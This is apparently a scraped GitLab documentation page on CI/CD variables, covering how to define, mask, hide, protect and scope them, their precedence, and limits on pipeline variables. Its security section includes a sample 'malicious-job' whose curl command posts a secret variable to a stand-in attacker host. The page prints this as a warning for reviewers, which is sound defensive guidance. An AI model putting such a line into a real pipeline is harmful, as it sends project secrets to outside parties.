---
url: https://docs.gitlab.com/ci/variables/
retrieved: 2026-09-29
command: firecrawl scrape https://docs.gitlab.com/ci/variables/ --only-main-content --json
statusCode: 200
transport: firecrawl-cli
completeness: full
title: CI/CD variables | GitLab Docs
---
/

* * *

# CI/CD variables

- Tier: Free, Premium, Ultimate
- Offering: GitLab.com, GitLab Self-Managed, GitLab Dedicated

CI/CD variables are a type of environment variable. You can use them to:

- Control the behavior of jobs and pipelines.
- Store values you want to re-use, for example in [job scripts](https://docs.gitlab.com/ci/variables/job_scripts/).
- Avoid hard-coding values in your `.gitlab-ci.yml` file.

Variable names are limited by the [shell the runner uses](https://docs.gitlab.com/runner/shells/)
to execute scripts. Each shell has its own set of reserved variable names.

To ensure consistent behavior, you should always put variable values in single or double quotes.
Variables are internally parsed by the [Psych YAML parser](https://docs.ruby-lang.org/en/master/Psych.html),
so quoted and unquoted variables might be parsed differently. For example:

- `VAR1: 012345` is interpreted as an octal value, so the value becomes `5349`.
- `VAR1: "012345"` is parsed as a string with a value of `012345`.
- `VAR1: 019` is parsed as the string `"019"` and not as octal, because `9` is not a valid
octal digit. Octal parsing only applies when all digits are 0-7.

For more information about advanced use of GitLab CI/CD, see [7 advanced GitLab CI workflow hacks](https://about.gitlab.com/webcast/7cicd-hacks/) shared by GitLab engineers.

## Predefined CI/CD variables [Permalink](https://docs.gitlab.com/ci/variables/\#predefined-cicd-variables "Permalink")

GitLab CI/CD makes a set of [predefined CI/CD variables](https://docs.gitlab.com/ci/variables/predefined_variables/)
available for use in pipeline configuration and job scripts. These variables contain
information about the job, pipeline, and other values you might need when the pipeline
is triggered or running.

You can use predefined CI/CD variables in your `.gitlab-ci.yml` without declaring them first.
For example:

yaml

```yaml
job1:
  stage: test
  script:
    - echo "The job's stage is '$CI_JOB_STAGE'"
```

The script in this example outputs `The job's stage is 'test'`.

## Define a CI/CD variable in the `.gitlab-ci.yml` file [Permalink](https://docs.gitlab.com/ci/variables/\#define-a-cicd-variable-in-the-gitlab-ciyml-file "Permalink")

To create a CI/CD variable in the `.gitlab-ci.yml` file, define the variable and
value with the [`variables`](https://docs.gitlab.com/ci/yaml/#variables) keyword.

Variables saved in the `.gitlab-ci.yml` file are visible to all users with access to
the repository, and should store only non-sensitive project configuration. For example,
the URL of a database saved in a `DATABASE_URL` variable. Sensitive variables containing values
like secrets or keys should be added in the UI.

You can define `variables` in:

- A job: The variable is only available in that job’s `script`, `before_script`, or `after_script` sections, and with some [job keywords](https://docs.gitlab.com/ci/yaml/#job-keywords).
- The top-level of the `.gitlab-ci.yml` file: The variable is available as a default for all jobs in a pipeline, unless a job defines a variable with the same name. The job’s variable takes precedence.

In both cases, you cannot use these variables with [global keywords](https://docs.gitlab.com/ci/yaml/#global-keywords).

For example:

yaml

```yaml
variables:
  ALL_JOBS_VAR: "A default variable"

job1:
  variables:
    JOB1_VAR: "Job 1 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR' and '$JOB1_VAR'"

job2:
  variables:
    ALL_JOBS_VAR: "Different value than default"
    JOB2_VAR: "Job 2 variable"
  script:
    - echo "Variables are '$ALL_JOBS_VAR', '$JOB2_VAR', and '$JOB1_VAR'"
```

In this example:

- `job1` outputs: `Variables are 'A default variable' and 'Job 1 variable'`
- `job2` outputs: `Variables are 'Different value than default', 'Job 2 variable', and ''`

Use the `value` and `description` keywords to define [variables that are prefilled](https://docs.gitlab.com/ci/pipelines/#prefill-variables-in-manual-pipelines)
for manually-triggered pipelines.

### Skip default variables in a single job [Permalink](https://docs.gitlab.com/ci/variables/\#skip-default-variables-in-a-single-job "Permalink")

If you don’t want default variables to be available in a job, set `variables` to `{}`:

yaml

```yaml
variables:
  DEFAULT_VAR: "A default variable"

job1:
  variables: {}
  script:
    - echo This job does not need any variables
```

## Define a CI/CD variable in the UI [Permalink](https://docs.gitlab.com/ci/variables/\#define-a-cicd-variable-in-the-ui "Permalink")

Sensitive variables like tokens or passwords should be stored in the settings in the UI,
not in the `.gitlab-ci.yml` file.

By default, pipelines from forked projects can’t access the CI/CD variables available to the parent project.
If you [run a merge request pipeline in the parent project for a merge request from a fork](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project),
all variables become available to the pipeline.

### For a project [Permalink](https://docs.gitlab.com/ci/variables/\#for-a-project "Permalink")

History

- Default visibility [changed](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494) from **Visible** to **Masked** in GitLab 18.3.

You can add CI/CD variables to a project’s settings. Projects can have a maximum of 8000 CI/CD variables.

Prerequisites:

- You must be a project member with the Maintainer role.

To add or update variables in the project settings:

1. In the top bar, select **Search or go to** and find your project.
2. In the left sidebar, select **Settings** \> **CI/CD**.
3. Expand **Variables**.
4. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner’s operating system. The value has extra limitations if **Visibility** is set to **Masked**
     or **Masked and hidden**.
   - **Type**: `Variable` (default) or [`File`](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables).
   - **Environment scope**: Optional. **All (default)** (`*`), a specific [environment](https://docs.gitlab.com/ci/environments/),
     or a wildcard environment scope.
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on protected branches or protected tags.
   - **Visibility**: Select **Visible**, **Masked** (default), or **Masked and hidden**.
   - **Expand variable reference**: Optional. If selected, the variable can reference another variable.
     It is not possible to reference another variable if **Visibility** is set to **Masked** or **Masked and hidden**.

Alternatively, project variables can be added [by using the API](https://docs.gitlab.com/api/project_level_variables/).

### For a group [Permalink](https://docs.gitlab.com/ci/variables/\#for-a-group "Permalink")

History

- Default visibility [changed](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494) from **Visible** to **Masked** in GitLab 18.3.

You can make a CI/CD variable available to all projects in a group. Groups can have a maximum of 30000 CI/CD variables.

Prerequisites:

- You must be a group member with the Owner role.

To add a group variable:

1. In the top bar, select **Search or go to** and find your group.
2. In the left sidebar, select **Settings** \> **CI/CD**.
3. Expand **Variables**.
4. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner’s operating system. The value has extra limitations if **Visibility** is set to **Masked**
     or **Masked and hidden**.
   - **Type**: `Variable` (default) or [`File`](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables).
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on protected branches or protected tags.
   - **Visibility**: Select **Visible**, **Masked** (default), **Masked and hidden**.
   - **Expand variable reference**: Optional. If selected, the variable can reference another variable.
     It is not possible to reference another variable if **Visibility** is set to **Masked** or **Masked and hidden**.

The group variables that are available in a project are listed in the project’s
**Settings** \> **CI/CD** \> **Variables** section. Variables from subgroups are recursively inherited.

Alternatively, group variables can be added [by using the API](https://docs.gitlab.com/api/group_level_variables/).

#### Environment scope [Permalink](https://docs.gitlab.com/ci/variables/\#environment-scope "Permalink")

- Tier: Premium, Ultimate

To set a group CI/CD variable to only be available for certain environments:

1. In the top bar, select **Search or go to** and find your group.
2. In the left sidebar, select **Settings** \> **CI/CD**.
3. Expand **Variables**.
4. To the right of the variable, select **Edit** (pencil).
5. For **Environment scope**, select **All (default)** (`*`), a specific [environment](https://docs.gitlab.com/ci/environments/),
or a wildcard environment scope.

### For an instance [Permalink](https://docs.gitlab.com/ci/variables/\#for-an-instance "Permalink")

- Tier: Free, Premium, Ultimate
- Offering: GitLab Self-Managed, GitLab Dedicated

History

- Default visibility [changed](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/195494) from **Visible** to **Masked** in GitLab 18.3.
- **Masked and hidden** option [introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/592708) in GitLab 19.0.

You can make a CI/CD variable available to all projects and groups in a GitLab instance.

Prerequisites:

- You must have administrator access to the instance.

To add an instance variable:

1. In the upper-right corner, select **Admin**.
2. In the left sidebar, select **Settings** \> **CI/CD**.
3. Expand **Variables**.
4. Select **Add variable** and fill in the details:
   - **Key**: Must be one line, with no spaces, using only letters, numbers, or `_`.
   - **Value**: The value is limited to 10,000 characters, but also bounded by any limits in the
     runner’s operating system. No other limitations if **Visibility** set to **Visible**.
   - **Type**: `Variable` (default) or `File`.
   - **Protect variable** Optional. If selected, the variable is only available in pipelines
     that run on protected branches or tags.
   - **Visibility**: Select **Visible**, **Masked** (default), or **Masked and hidden**.
   - **Expand variable reference**: Optional. If selected, the variable can reference another variable.
     It is not possible to reference another variable if **Visibility** is set to **Masked** or **Masked and hidden**.

Alternatively, instance variables can be added [by using the API](https://docs.gitlab.com/api/instance_level_ci_variables/).

## CI/CD variable security [Permalink](https://docs.gitlab.com/ci/variables/\#cicd-variable-security "Permalink")

Code pushed to the `.gitlab-ci.yml` file could compromise your variables. Variables could
be accidentally exposed in a job log, or maliciously sent to a third party server.

Review all merge requests that introduce changes to the `.gitlab-ci.yml` file before you:

- [Run a pipeline in the parent project for a merge request submitted from a forked project](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#run-pipelines-in-the-parent-project).
- Merge the changes.

Review the `.gitlab-ci.yml` file of imported projects before you add files or run pipelines against them.

The following example shows malicious code in a `.gitlab-ci.yml` file:

yaml

```yaml
accidental-leak-job:
  script:                                         # Password exposed accidentally
    - echo "This script logs into the DB with $USER $PASSWORD"
    - db-login $USER $PASSWORD

malicious-job:
  script:                                         # Secret exposed maliciously
    - curl --request POST --data "secret_variable=$SECRET_VARIABLE" "https://maliciouswebsite.abcd/"
```

To help reduce the risk of accidentally leaking secrets through scripts like in `accidental-leak-job`,
all variables containing sensitive information should always be masked in job logs.
You can also [limit a variable to protected branches and tags only](https://docs.gitlab.com/ci/variables/#protect-a-cicd-variable).

Alternatively, [connect with an external secrets management provider](https://docs.gitlab.com/ci/secrets/)
to store and retrieve secrets.

Malicious scripts like in `malicious-job` must be caught during the review process.
Reviewers should never trigger a pipeline when they find code like this, because
malicious code can compromise both masked and protected variables.

Variable values are encrypted using [`aes-256-cbc`](https://en.wikipedia.org/wiki/Advanced_Encryption_Standard)
and stored in the database. This data can be read and decrypted with a
valid [secrets file](https://docs.gitlab.com/administration/backup_restore/troubleshooting_backup_gitlab/#when-the-secrets-file-is-lost).

### Mask a CI/CD variable [Permalink](https://docs.gitlab.com/ci/variables/\#mask-a-cicd-variable "Permalink")

Masking a CI/CD variable is not a guaranteed way to prevent malicious users from
accessing variable values. To ensure security of sensitive information,
consider using [external secrets](https://docs.gitlab.com/ci/secrets/) and [file type variables](https://docs.gitlab.com/ci/variables/#use-file-type-cicd-variables)
to prevent commands such as `env` or `printenv` from printing secret variables.

You can mask a CI/CD variable for a project, group, or instance to prevent
its value from appearing in job logs. When a job outputs the value of a
masked variable, the value is replaced with `[MASKED]` in the job log.
In some cases, the `[MASKED]` value could be followed by `x` characters as well.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

To mask a variable:

1. For the group, project, or in the **Admin** area, select **Settings** \> **CI/CD**.
2. Expand **Variables**.
3. Next to the variable you want to protect, select **Edit**.
4. Under **Visibility**, select **Mask variable**.
5. Recommended. Clear the [**Expand variable reference**](https://docs.gitlab.com/ci/variables/#allow-cicd-variable-expansion) checkbox.
If variable expansion is enabled, the only non-alphanumeric characters you can use in
the variable value are: `_`, `:`, `@`, `-`, `+`, `.`, `~`, `=`, `/`, and `~`.
When the setting is disabled, all characters can be used.
6. Select **Update variable**.

The value of the variable must:

- Be a single line with no spaces.
- Be 8 characters or longer.
- Not match the name of an existing predefined or custom CI/CD variable.

If a process outputs the value in a slightly modified way, the value can’t be masked.
For example, if the shell adds `\` to escape special characters, the value isn’t masked:

- Example masked variable value: `My[value]`
- This output would not be masked: `My\[value\]`

When `CI_DEBUG_SERVICES` is enabled, the variable value might be revealed. For more information, see
[service container logging](https://docs.gitlab.com/ci/services/#capturing-service-container-logs).

### Hide a CI/CD variable [Permalink](https://docs.gitlab.com/ci/variables/\#hide-a-cicd-variable "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/29674) in GitLab 17.4 [with a feature flag](https://docs.gitlab.com/administration/feature_flags/) named `ci_hidden_variables`. Enabled by default.
- [Generally available](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/165843) in GitLab 17.6. Feature flag `ci_hidden_variables` removed.

In addition to masking, you can also prevent the value of CI/CD variables from being revealed
in the **CI/CD** settings page. Hiding a variable is only possible when creating a new variable,
you cannot update an existing variable to be hidden.

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).
- The variable value must match the [requirements for masked variables](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable).

To hide a variable, select **Masked and hidden** in the **Visibility** section when
you [add a new CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).
After you save the variable, the variable can be used in CI/CD pipelines, but cannot
be revealed in the UI again.

### Protect a CI/CD variable [Permalink](https://docs.gitlab.com/ci/variables/\#protect-a-cicd-variable "Permalink")

You can configure a project, group, or instance CI/CD variable to be available
only to pipelines that run on [protected branches](https://docs.gitlab.com/user/project/repository/branches/protected/)
or [protected tags](https://docs.gitlab.com/user/project/protected_tags/).

Merged results pipelines and merge request pipelines can [optionally access protected variables](https://docs.gitlab.com/ci/pipelines/merge_request_pipelines/#control-access-to-protected-variables-and-runners).

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

To set a variable as protected:

1. For the project or group, go to **Settings** \> **CI/CD**.
2. Expand **Variables**.
3. Next to the variable you want to protect, select **Edit**.
4. Select the **Protect variable** checkbox.
5. Select **Update variable**.

The variable is available for all subsequent pipelines.

### Use file type CI/CD variables [Permalink](https://docs.gitlab.com/ci/variables/\#use-file-type-cicd-variables "Permalink")

All predefined CI/CD variables and variables defined in the `.gitlab-ci.yml` file
are “variable” type ( [`"variable_type": "env_var"` in the API](https://docs.gitlab.com/api/project_level_variables/)).

Variable type variables:

- Consist of a key and value pair.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value as the environment variable value.

Project, group, and instance CI/CD variables are “variable” type by default, but can
optionally be set as a “file” type (`"variable_type": "file"` in the API).
File type variables:

- Consist of a key, value, and file.
- Are made available in jobs as environment variables, with:
  - The CI/CD variable key as the environment variable name.
  - The CI/CD variable value saved to a temporary file.
  - The path to the temporary file as the environment variable value.

Use file type CI/CD variables for tools that need a file as input.

For example, the AWS CLI and `kubectl` are both tools that use `File` type variables for configuration.
If you are using `kubectl` with:

- A variable with a key of `KUBE_URL` and `https://example.com` as the value.
- A file type variable with a key of `KUBE_CA_PEM` and a certificate as the value.

Pass `KUBE_URL` as a `--server` option, which accepts a variable, and pass `$KUBE_CA_PEM`
as a `--certificate-authority` option, which accepts a path to a file:

shell

```shell
kubectl config set-cluster e2e --server="$KUBE_URL" --certificate-authority="$KUBE_CA_PEM"
```

#### Use a `.gitlab-ci.yml` variable as a file type variable [Permalink](https://docs.gitlab.com/ci/variables/\#use-a-gitlab-ciyml-variable-as-a-file-type-variable "Permalink")

You cannot set a CI/CD variable [defined in the `.gitlab-ci.yml` file](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-gitlab-ciyml-file)
as a file type variable. If you have a tool that requires a file path as an input,
but you want to use a variable defined in the `.gitlab-ci.yml`:

- Run a command that saves the value of the variable in a file.
- Use that file with your tool.

For example:

yaml

```yaml
variables:
  SITE_URL: "https://gitlab.example.com"

job:
  script:
    - echo "$SITE_URL" > "site-url.txt"
    - mytool --url-file="site-url.txt"
```

## Allow CI/CD variable expansion [Permalink](https://docs.gitlab.com/ci/variables/\#allow-cicd-variable-expansion "Permalink")

History

- **Expand variable** option [disabled](https://gitlab.com/gitlab-org/gitlab/-/merge_requests/209144) by default in GitLab 18.6.

You can set a variable to treat values with the `$` character as a reference to another variable.
When the pipeline runs, the reference expands to use the value of the referenced variable.

CI/CD variables defined in the UI are not expanded by default. For CI/CD variables defined in
the `.gitlab-ci.yml` file, control variable expansion with the [`variables:expand` keyword](https://docs.gitlab.com/ci/yaml/#variablesexpand).

Prerequisites:

- You must have the same role or access level as required to [add a CI/CD variable in the UI](https://docs.gitlab.com/ci/variables/#define-a-cicd-variable-in-the-ui).

To enable variable expansion for the variable:

1. For the project or group, go to **Settings** \> **CI/CD**.
2. Expand **Variables**.
3. Next to the variable you do not want expanded, select **Edit**.
4. Select the **Expand variable reference** checkbox.
5. Select **Update variable**.

Do not [mask](https://docs.gitlab.com/ci/variables/#mask-a-cicd-variable) a variable value if you want to use variable expansion.
If both masking and variable expansion are combined, character limitations prevent
the use of the `$` to reference other variables.

## CI/CD variable precedence [Permalink](https://docs.gitlab.com/ci/variables/\#cicd-variable-precedence "Permalink")

You can define CI/CD variables with the same name in more than one place.
When a job runs, GitLab uses the value from the source with the highest precedence.
The highest-precedence value that exists overrides all lower-precedence values.

From highest to lowest, the order of precedence is:

01. Variables defined in a
    [pipeline execution policy](https://docs.gitlab.com/user/application_security/policies/pipeline_execution_policies/#cicd-variables)
    or a [scan execution policy](https://docs.gitlab.com/user/application_security/policies/scan_execution_policies/).
    These variables apply only to the jobs a policy adds to a pipeline, not to the other jobs in the
    pipeline.
02. Manual job variables, set when you run a manual job.
03. [Pipeline variables](https://docs.gitlab.com/ci/variables/#use-pipeline-variables), from:
    - The **Run pipeline** page
    - A pipeline schedule
    - The pipelines API
    - The triggers API
    - The `ci.variable` push option
    - An upstream pipeline
04. [Project variables](https://docs.gitlab.com/ci/variables/#for-a-project).
05. [Group variables](https://docs.gitlab.com/ci/variables/#for-a-group). If the same variable name exists in a group and its subgroups,
    the job uses the value from the closest subgroup. For example, if you have
    `Group > Subgroup 1 > Subgroup 2 > Project`, the variable defined in `Subgroup 2` takes precedence.
06. [Instance variables](https://docs.gitlab.com/ci/variables/#for-an-instance).
07. Variables from [`dotenv` reports](https://docs.gitlab.com/ci/variables/dotenv_variables/#pass-variables-to-later-jobs) in jobs
    listed in `dependencies` or `needs`.
08. Variables in the `.gitlab-ci.yml` file, from highest to lowest precedence:
    1. [`rules:variables`](https://docs.gitlab.com/ci/yaml/#rulesvariables) in the job.
    2. `variables` in the job.
    3. [`workflow:rules:variables`](https://docs.gitlab.com/ci/yaml/#workflowrulesvariables).
    4. [Default `variables`](https://docs.gitlab.com/ci/yaml/#default-variables) at the top level of the file.
09. [Deployment variables](https://docs.gitlab.com/ci/variables/predefined_variables/#deployment-variables).
10. [Predefined variables](https://docs.gitlab.com/ci/variables/predefined_variables/). Not all predefined variables have the lowest
    precedence. You cannot override `CI_ENVIRONMENT_ID`, `CI_ENVIRONMENT_SLUG`, `CI_ENVIRONMENT_URL`,
    or `CI_PAGES_URL`.

For example, your project has a `DEPLOY_TARGET` project variable set to `production`, and this
`.gitlab-ci.yml` file:

yaml

```yaml
variables:
  DEPLOY_TARGET: "staging"

deploy:
  variables:
    DEPLOY_TARGET: "review"
  script:
    - echo "Deploying to $DEPLOY_TARGET"
```

In this example:

- The `deploy` job prints `Deploying to production`, because a project variable outranks both
values set in the `.gitlab-ci.yml` file.
- Without the project variable, the job prints `Deploying to review`, because a variable defined
in a job outranks a default variable.
- If you run the pipeline manually and set `DEPLOY_TARGET` to `canary`, the job prints
`Deploying to canary`, because a pipeline variable outranks a project variable.

Additional details:

- Values from [`secrets`](https://docs.gitlab.com/ci/yaml/#secrets) are not part of this order of precedence.
The runner retrieves them from the external secrets manager when the job runs.

- [Inputs](https://docs.gitlab.com/ci/inputs/) are not CI/CD variables and take no part in this order of precedence.
GitLab replaces inputs with their values when the pipeline is created, so a project, group, or
instance variable cannot change an input value.


## Use pipeline variables [Permalink](https://docs.gitlab.com/ci/variables/\#use-pipeline-variables "Permalink")

Pipeline variables are variables that are specified when running a new pipeline.

In [GitLab 17.7](https://docs.gitlab.com/update/deprecations/#increased-default-security-for-use-of-pipeline-variables)
and later, [pipeline inputs](https://docs.gitlab.com/ci/inputs/#for-a-pipeline) are recommended over passing pipeline variables.
For enhanced security, you should [disable pipeline variables](https://docs.gitlab.com/ci/variables/#restrict-pipeline-variables) when using inputs.

Prerequisites:

- You must have the Developer role in the project.

You can specify a pipeline variable when you:

- [Run a pipeline manually](https://docs.gitlab.com/ci/jobs/job_control/#specify-variables-when-running-manual-jobs) in the UI.
- Create a [scheduled pipeline](https://docs.gitlab.com/ci/pipelines/schedules/#create-a-pipeline-schedule).
- Create a pipeline by using [the `pipelines` API endpoint](https://docs.gitlab.com/api/pipelines/#create-a-new-pipeline).
- Create a pipeline by using [the `triggers` API endpoint](https://docs.gitlab.com/ci/triggers/#pass-cicd-variables-in-the-api-call).
- Use [push options](https://docs.gitlab.com/topics/git/commit/#push-options-for-gitlab-cicd).
- Pass variables to a downstream pipeline by using either the [`variables` keyword](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline),
[`trigger:forward` keyword](https://docs.gitlab.com/ci/yaml/#triggerforward) or [`dotenv` variables](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-dotenv-variables-created-in-a-job).

These variables have high precedence and can override variables with the same name defined in the
project, group, or instance settings, or in the `.gitlab-ci.yml` file.

You should avoid overriding predefined variables in most cases, as it can cause the pipeline to behave unexpectedly.

### Restrict pipeline variables [Permalink](https://docs.gitlab.com/ci/variables/\#restrict-pipeline-variables "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/440338) in GitLab 17.1.
- For GitLab.com, setting defaults [updated for all new projects in new namespaces](https://gitlab.com/gitlab-org/gitlab/-/issues/502382)
to `no_one_allowed` for `ci_pipeline_variables_minimum_override_role` in GitLab 17.7.

You can limit who can run pipelines with pipeline variables to specific user roles.
When users with a lower role try to use pipeline variables, they receive an
`Insufficient permissions to set pipeline variables` error message.

Prerequisites:

- You must have the Maintainer role in the project. If the minimum role was previously set to `owner`
or `no_one_allowed`, then you must have the Owner role in the project.

To limit the use of pipeline variables to only the Maintainer role and higher:

- Go to **Settings** \> **CI/CD** \> **Variables**.
- Under **Minimum role to use pipeline variables**, select one of:
  - `no_one_allowed`: No pipelines can run with pipeline variables.
    Default for new projects in new namespaces on GitLab.com.
    After the setting is at this value, only the Owner role can change it.
  - `owner`: Only users with the Owner role can run pipelines with pipeline variables.
    After the setting is at this value, only the Owner role can change it.
  - `maintainer`: Only users with the Maintainer or Owner role can run pipelines with pipeline variables.
    Default when not specified on GitLab Self-Managed and GitLab Dedicated.
  - `developer`: Only users with the Developer, Maintainer, or Owner role can run pipelines with pipeline variables.

You can also use [the projects API](https://docs.gitlab.com/api/projects/#update-a-project) to set
the role for the `ci_pipeline_variables_minimum_override_role` setting.

This restriction does not affect CI/CD variables from the project or group settings.
Most jobs can still use the `variables` keyword in the YAML configuration.
Jobs that use the `trigger` keyword to start a [multi-project pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#multi-project-pipelines)
cannot, because these jobs pass their variables to the downstream pipeline as pipeline variables.

For these jobs:

- The setting in the downstream project applies. GitLab checks the user’s role in the
downstream project. Their role in the upstream project has no effect.
- If their role is lower than the minimum role set in the downstream project, the trigger job
fails with an `Insufficient permissions to set pipeline variables` error, and GitLab does not
create the downstream pipeline.
- A trigger job that passes no variables is not restricted. Trigger jobs inherit
[default `variables`](https://docs.gitlab.com/ci/yaml/#default-variables), so a job with no `variables`
keyword can still pass variables. To prevent this, use
[`inherit:variables: false`](https://docs.gitlab.com/ci/yaml/#inheritvariables).
- The restriction also applies to variables forwarded with
[`trigger:forward:pipeline_variables`](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#control-what-type-of-variables-to-forward-to-downstream-pipelines).
This forwarding is disabled by default.

Jobs that trigger a [parent-child pipeline](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#parent-child-pipelines)
in the same project are not restricted by this setting.

#### Enable pipeline variable restriction for multiple projects [Permalink](https://docs.gitlab.com/ci/variables/\#enable-pipeline-variable-restriction-for-multiple-projects "Permalink")

History

- [Introduced](https://gitlab.com/gitlab-org/gitlab/-/issues/514242) in GitLab 18.4.

For groups with many projects, you can disable pipeline variables
in all projects that don’t use them. This option sets the
**Minimum role to use pipeline variables** setting to `no_one_allowed` for projects
that have never used pipeline variables.

Prerequisites:

- You must have the Owner role for the group.

To enable the pipeline variable restriction setting in projects in the group:

1. In the top bar, select **Search or go to** and find your group.
2. In the left sidebar, select **Settings** \> **CI/CD**.
3. Expand **Variables**.
4. In the **Disable pipeline variables in projects that don’t use them** section,
select **Start migration**.

The migration runs in the background. You receive an email notification
when the migration is complete. Project maintainers can later change the setting
for their individual projects if needed.

## Exporting variables [Permalink](https://docs.gitlab.com/ci/variables/\#exporting-variables "Permalink")

Scripts executed in separate shell contexts do not share exports, aliases,
local function definitions, or any other local shell updates.

This means that if a job fails, variables created by user-defined scripts are not
exported.

When runners execute jobs defined in `.gitlab-ci.yml`:

- Scripts specified in `before_script` and the main script are executed together in
a single shell context, and are concatenated.
- Scripts specified in `after_script` run in a shell context completely separate to
the `before_script` and the specified scripts.

Regardless of the shell the scripts are executed in, the runner output includes:

- Predefined variables.
- Variables defined in:
  - Instance, group, or project CI/CD settings.
  - The `.gitlab-ci.yml` file in the `variables:` section.
  - The `.gitlab-ci.yml` file in the `secrets:` section.
  - The `config.toml`.

The runner cannot handle manual exports, shell aliases, and functions executed in the body of the script, like `export MY_VARIABLE=1`.

For example, in the following `.gitlab-ci.yml` file, the following scripts are defined:

yaml

```yaml
job:
 variables:
   JOB_DEFINED_VARIABLE: "job variable"
 before_script:
   - echo "This is the 'before_script' script"
   - export MY_VARIABLE="variable"
 script:
   - echo "This is the 'script' script"
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
 after_script:
   - echo "JOB_DEFINED_VARIABLE's value is ${JOB_DEFINED_VARIABLE}"
   - echo "CI_COMMIT_SHA's value is ${CI_COMMIT_SHA}"
   - echo "MY_VARIABLE's value is ${MY_VARIABLE}"
```

When the runner executes the job:

1. `before_script`is executed:
1. Prints to the output.
2. Defines the variable for `MY_VARIABLE`.
2. `script`is executed:
1. Prints to the output.
2. Prints the value of `JOB_DEFINED_VARIABLE`.
3. Prints the value of `CI_COMMIT_SHA`.
4. Prints the value of `MY_VARIABLE`.
3. `after_script`is executed in a new, separate shell context:
1. Prints to the output.
2. Prints the value of `JOB_DEFINED_VARIABLE`.
3. Prints the value of `CI_COMMIT_SHA`.
4. Prints an empty value of `MY_VARIABLE`. The variable value cannot be detected because `after_script` is in a separate shell context to `before_script`.

## Related topics [Permalink](https://docs.gitlab.com/ci/variables/\#related-topics "Permalink")

- You can configure [Auto DevOps](https://docs.gitlab.com/topics/autodevops/) to pass CI/CD variables
to a running application. To make a CI/CD variable available as an environment variable in the running application’s container,
[prefix the variable key](https://docs.gitlab.com/topics/autodevops/cicd_variables/#configure-application-secret-variables)
with `K8S_SECRET_`.

- The [Managing the Complex Configuration Data Management Monster Using GitLab](https://www.youtube.com/watch?v=v4ZOJ96hAck)
video is a walkthrough of the [Complex Configuration Data Monorepo](https://gitlab.com/guided-explorations/cfg-data/complex-config-data-using-ci-variables/config-data-top-scope/config-data-subscope/config-data-monorepo)
working example project. It explains how multiple levels of group CI/CD variables
can be combined with environment-scoped project variables for complex configuration
of application builds or deployments.

The example can be copied to your own group or instance for testing. More details
on what other GitLab CI patterns are demonstrated are available at the project page.

- You can [pass CI/CD variables to downstream pipelines](https://docs.gitlab.com/ci/pipelines/downstream_pipelines/#pass-cicd-variables-to-a-downstream-pipeline).
Use [`trigger:forward` keyword](https://docs.gitlab.com/ci/yaml/#triggerforward) to specify what type of variables
to pass to the downstream pipeline.


Was this page helpful?YesNo
